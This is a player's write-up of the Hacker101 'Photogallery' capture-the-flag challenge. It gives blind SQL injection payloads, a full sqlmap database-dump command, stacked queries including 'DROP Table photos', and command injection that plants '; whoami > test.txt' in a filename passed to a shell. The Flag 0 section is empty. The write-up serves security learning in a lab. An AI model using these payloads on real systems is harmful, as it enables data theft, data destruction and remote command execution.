# Photogallery

This ctf took me quit a while to figure out. I personally found flag 1 first then flag 0 and after another day or two flag 2. I believe that most people will get flag 1 before flag 0. So i will write up flag 1 first. It's pretty straight forward.

## Flag 1 – SQL Injection

Navigating the website you will notice that there is not a lot to do. We can't buy anything click on anything or comment. Checking out the source code of the website tells you that the images are being loaded from the url `/fetch?id=X` (X is a placeholder for a number). Browsing to that url you will see a site with the raw image data. The interesting part however is the url itself. Looking at the url parameter and replacing the value with sth like 2-1 for example shows that the application is vulnerable to sql injection. Great!

### Blind injection
Blind sql injeciton can be used to gain information about the database layout. For example using the following query shows the length of the db_name :

```
.../fetch?id=4 OR LENGTH(database()) = 6
```
from there it is possible to guess the name using queries similar to the following:
```
.../fetch?id=4 or database() LIKE '______'
```
You can replace a single '_' with any sign in order to guess the sign at that position. Once you guessed the correct value you can replace the next underscore. The underscore characters serve as a wildcard for a single character. It is important to use 6 underscores since that is the length of the databse name.

After obtaining the database name the following query can be used to find out the number of tables in the database:
```
.../fetch?id=1 AND (SELECT Count(*) FROM information_schema.tables WHERE table_schema=database())=2
```

After that i went after the table names. There is a great tutorial on doing this [here](https://delayma.wordpress.com/2019/01/09/magical-image-gallery-1-3-hacker-101-ctf/).

The db layout looks like this :
DB Layout:
  db_name: "level5"   
  num_of_tables : 2  
  tables_names : albums, photos  

For the extraction of the data i used sqlmap. I dumped the entire database using the following command:
```
sqlmap -u ".../fetch?id=2" --method GET --dump -D level5 -p id --code 200 --skip-waf --random-agent --threads 10 -o
```

You will find flag 1 in the entry for the invisible kitty.


## Flag 0 – SQL Injection



### Union based injection


## Flag 2 – Stacked Queries

This flag is pretty straight forward if you read all of the hints carefully and already got acces to the source code from flag 0. Using stacked queries its possible to execute alot of sql commands. I tested this using :
```
.../fetch?id=1; DROP Table photos
```

This command drops the photo table and breaks the app entirely. Afterwards you have to request a new instance from the hacker101 ctf page. This however shows that the second command gets executed.
Nice! Now where to go from here ? Try more commands !
Next i tried to insert a new photo with id 4 :
```
../fetch?id=1; INSERT INTO photos(id,title,parent, filename) VALUES(4,test,1,files/adorable.jpg);
```
I'm using adorable.jpg because i know the image exists and the server could open it if everything else checks out. The command did not work however and there are actually multiple reasons.
  1. The data in the title and filename field are somekind of text meaning of type char or varchar. When inserting the values it is important to use '' around these values: ```... VALUES(4,'test', 1, 'files/adorable.jpg');```  
  2. From what i can tell commands like UPDATE and INSERT requiere the use of transactions. I noticed that something wasn't working while running the above statement. The hint helped me figure it out. In the end i used the following command:
  
```
../fetch?id=1; START TRANSACTION; INSERT INTO photos(id,title,parent, filename) VALUES(4,'test',1,'files/adorable.jpg'); COMMIT;
```

After trying out different queries i took another look at the source code and especially the size calculation of the albums.
```
        rep += '' cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id,))
	fns = []	
        for pid, ptitle, pfn in cur.fetchall():
            rep += '%s' % (pid, sanitize(ptitle))
            fns.append(pfn)
            rep += 'Space used: ' +
	    subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns\
	    ), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + ''
```
From the main page i knew that it was broken since it always shows 0. The reason seems to be that it always adds 'files/' before each filename ending in sth like 'files/files/adorable.jpg'. The interesting part however is that the filename from the database gets added to a bash command. After realizing that i extracted the command from the file and tested the bash command locally on my machine aswell as the commands i wanted to inject. For the commands to run properly on the remote machine i needed 2 things:
  1. A way to see the output of the command on the remote machine  
  2. A way to inject my command into the database.

How to run a command ?
For that i build a string i want to inject into the db. First i terminate the statement with a ; similar to stacked queries in sql. Then i chose a command, f.e. ```whoami```. Finally i needed a way to see the output. For that i decided to create a new file on the machine using >. The final command loos like this ```; whoami > test.txt```.
I added it to the database with this :
```
.../fetch?id=1;START TRANSACTION; UPDATE photos SET title='3test1', filename='; whoami > test.txt' WHERE id=3; COMMIT;
```
Impotant is the usage of transactions and the '' surrounding the values. After using the above command i navigated to the main page in order for it to execute. Now i only needed to take a look at the test.txt file. There are multiple ways to look at the file. I chose to add it to the database and access it through fetch + id.

...










